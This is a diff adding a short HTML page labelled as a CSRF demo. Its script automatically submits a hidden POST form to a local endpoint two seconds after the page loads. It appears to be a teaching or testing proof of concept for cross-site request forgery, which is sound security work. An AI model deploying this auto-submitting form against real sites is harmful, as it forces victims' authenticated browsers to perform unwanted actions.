@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>CSRF Demo page</title>
+    </head>
+    <body>
+        <p>U ngule</p>
+        <form id="csrf-form" method="POST" action="http://localhost:4200/csrf"></form>
+
+        <script>
+            setTimeout(function() {
+                document.getElementById("csrf-form").submit();
+            }, 2000);
+        </script>
+    </body>
+</html>
